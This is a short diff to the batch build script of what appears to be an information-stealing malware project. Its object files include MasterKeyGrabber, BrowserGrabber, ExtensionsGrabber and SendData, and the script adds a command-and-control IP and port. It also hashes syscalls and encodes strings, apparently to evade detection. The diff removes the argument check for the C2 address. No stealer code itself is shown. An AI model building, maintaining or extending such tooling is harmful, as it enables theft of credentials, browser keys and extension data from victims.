@@ -11,16 +11,11 @@ set "ASMSRC=src/asm/syscalls.asm src/asm/GetPEB.asm src/asm/NtAllocateCallBack.a
 set "OBJ=main.o decoding.o MasterKeyGrabber.o ExtensionsGrabber.o SendData.o DllOps.o FileIO.o MemoryUtils.o BrowserGrabber.o hashing.o StringUtils.o DirectoryOps.o globals.o AddrResolution.o PathOps.o LdrLoadDllCallBack.o syscalls.o NtAllocateCallBack.o GetPEB.o"
 set "TARGET=bin\main.exe"
 
-REM CHECK ARGS
-if "%~2"=="" (
-    echo usage: build.bat ^<ip^> ^<port^>
-    exit /b 1
-)
 
 REM ADDING IP AND PORT AND HASHING FUNCTIONS/SYSCALLS
 echo Adding the C2 IP and PORT.
 echo Hashing syscalls and functions and encoding strings.
-python build-tools/prebuild.py %1 %2
+python build-tools/prebuild.py
 if %errorlevel% neq 0 (
     exit /b 1
 )
